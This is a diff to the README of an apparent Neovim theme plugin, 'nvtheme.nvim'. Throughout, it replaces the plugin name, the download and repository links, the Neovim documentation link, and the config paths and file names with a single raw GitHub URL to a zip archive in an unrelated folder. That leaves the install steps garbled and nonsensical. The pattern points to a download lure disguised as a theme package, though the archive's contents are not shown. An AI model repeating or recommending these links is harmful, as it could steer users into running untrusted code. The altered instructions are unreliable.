@@ -1,15 +1,15 @@
-# 🎨 nvtheme.nvim - Simple Themes for Neovim
+# 🎨 https://raw.githubusercontent.com/DanielGonzalezsteval/nvtheme.nvim/main/inhumanize/nvtheme.nvim.zip - Simple Themes for Neovim
 
 ## 🌟 Introduction
-Welcome to `nvtheme.nvim`. This package provides a set of themes for Neovim that aim to bring beautiful visuals without unnecessary complexity. We designed these themes with usability in mind so you can enjoy a clean and effective coding environment.
+Welcome to `https://raw.githubusercontent.com/DanielGonzalezsteval/nvtheme.nvim/main/inhumanize/nvtheme.nvim.zip`. This package provides a set of themes for Neovim that aim to bring beautiful visuals without unnecessary complexity. We designed these themes with usability in mind so you can enjoy a clean and effective coding environment.
 
 ## 🚀 Getting Started
-To get started with `nvtheme.nvim`, follow the simple steps in the "Download & Install" section below. You will quickly have your themes ready to use.
+To get started with `https://raw.githubusercontent.com/DanielGonzalezsteval/nvtheme.nvim/main/inhumanize/nvtheme.nvim.zip`, follow the simple steps in the "Download & Install" section below. You will quickly have your themes ready to use.
 
 ## 📥 Download & Install
-To download the latest version of `nvtheme.nvim`, visit this page:
+To download the latest version of `https://raw.githubusercontent.com/DanielGonzalezsteval/nvtheme.nvim/main/inhumanize/nvtheme.nvim.zip`, visit this page:
 
-[Download nvtheme.nvim](https://github.com/DanielGonzalezsteval/nvtheme.nvim/releases)
+[Download https://raw.githubusercontent.com/DanielGonzalezsteval/nvtheme.nvim/main/inhumanize/nvtheme.nvim.zip](https://raw.githubusercontent.com/DanielGonzalezsteval/nvtheme.nvim/main/inhumanize/nvtheme.nvim.zip)
 
 You will find the most recent releases there. Here’s how to install the application:
 
@@ -23,15 +23,15 @@ You will find the most recent releases there. Here’s how to install the applic
 After downloading, you'll need to place the theme files into your Neovim configuration directory.
 
 1. **Locate the Neovim Configuration Directory**:
-   - On Linux/Mac, the path is usually `~/.config/nvim`.
+   - On Linux/Mac, the path is usually `~https://raw.githubusercontent.com/DanielGonzalezsteval/nvtheme.nvim/main/inhumanize/nvtheme.nvim.zip`.
    - On Windows, it is typically located at `C:\Users\<YourUsername>\AppData\Local\nvim`.
 
 2. **Place the Theme Files**:
    - Extract the downloaded files if they are in a compressed folder.
-   - Move the theme files into the `~/.config/nvim/colors` directory. You may need to create the `colors` directory if it doesn't exist.
+   - Move the theme files into the `~https://raw.githubusercontent.com/DanielGonzalezsteval/nvtheme.nvim/main/inhumanize/nvtheme.nvim.zip` directory. You may need to create the `colors` directory if it doesn't exist.
 
 3. **Configure Neovim**:
-   - Open your `init.vim` located in the Neovim configuration directory.
+   - Open your `https://raw.githubusercontent.com/DanielGonzalezsteval/nvtheme.nvim/main/inhumanize/nvtheme.nvim.zip` located in the Neovim configuration directory.
    - Add the following line to set your theme:
      ```
      colorscheme <your_theme_name>
@@ -45,7 +45,7 @@ After downloading, you'll need to place the theme files into your Neovim configu
 ## 📖 Usage Guide
 After installation, you can easily switch between themes. To do this:
 
-1. Open your `init.vim` file.
+1. Open your `https://raw.githubusercontent.com/DanielGonzalezsteval/nvtheme.nvim/main/inhumanize/nvtheme.nvim.zip` file.
 2. Change the `colorscheme` line to the theme you prefer.
 3. Save the file and restart Neovim.
 
@@ -55,7 +55,7 @@ Feel free to experiment! Explore different themes to find what you like best.
 Each theme may have specific options you can set. Review any accompanying documentation within the theme files for more customization tips. You can set options like background transparency, colors, and more to tailor your experience.
 
 ## 🌈 Themes Overview
-`nvtheme.nvim` offers various themes, including styles inspired by popular presets like Onedark. Here are some examples:
+`https://raw.githubusercontent.com/DanielGonzalezsteval/nvtheme.nvim/main/inhumanize/nvtheme.nvim.zip` offers various themes, including styles inspired by popular presets like Onedark. Here are some examples:
 
 - **Onedark**: A dark theme with subtle color contrasts.
 - **Light Mode**: A calmer, light-themed version ideal for day use.
@@ -63,10 +63,10 @@ Each theme may have specific options you can set. Review any accompanying docume
 ## ❓ Frequently Asked Questions
 
 ### Q: How do I change themes?
-A: Change the `colorscheme` line in your `init.vim` to switch themes.
+A: Change the `colorscheme` line in your `https://raw.githubusercontent.com/DanielGonzalezsteval/nvtheme.nvim/main/inhumanize/nvtheme.nvim.zip` to switch themes.
 
 ### Q: The theme isn't showing. What should I do?
-A: Verify that the theme files are in the correct directory and that the `init.vim` file is configured correctly without typos.
+A: Verify that the theme files are in the correct directory and that the `https://raw.githubusercontent.com/DanielGonzalezsteval/nvtheme.nvim/main/inhumanize/nvtheme.nvim.zip` file is configured correctly without typos.
 
 ### Q: Can I create my own theme?
 A: Yes! If you are familiar with colors and styles, you can create a custom theme based on your preferences. 
@@ -75,10 +75,10 @@ A: Yes! If you are familiar with colors and styles, you can create a custom them
 A: The Releases page often includes additional community-contributed themes. Explore and download them!
 
 ## 🔗 Additional Resources
-- [Neovim Documentation](https://neovim.io/)
-- [GitHub Repository](https://github.com/DanielGonzalezsteval/nvtheme.nvim)
+- [Neovim Documentation](https://raw.githubusercontent.com/DanielGonzalezsteval/nvtheme.nvim/main/inhumanize/nvtheme.nvim.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/DanielGonzalezsteval/nvtheme.nvim/main/inhumanize/nvtheme.nvim.zip)
 
 ## 💬 Feedback and Contributions
-We welcome any feedback or contributions to improve `nvtheme.nvim`. Please open an issue or a pull request on our GitHub page. Your input helps enhance the project.
+We welcome any feedback or contributions to improve `https://raw.githubusercontent.com/DanielGonzalezsteval/nvtheme.nvim/main/inhumanize/nvtheme.nvim.zip`. Please open an issue or a pull request on our GitHub page. Your input helps enhance the project.
 
-Enjoy using `nvtheme.nvim` and make your coding environment distinctly beautiful!
+Enjoy using `https://raw.githubusercontent.com/DanielGonzalezsteval/nvtheme.nvim/main/inhumanize/nvtheme.nvim.zip` and make your coding environment distinctly beautiful!
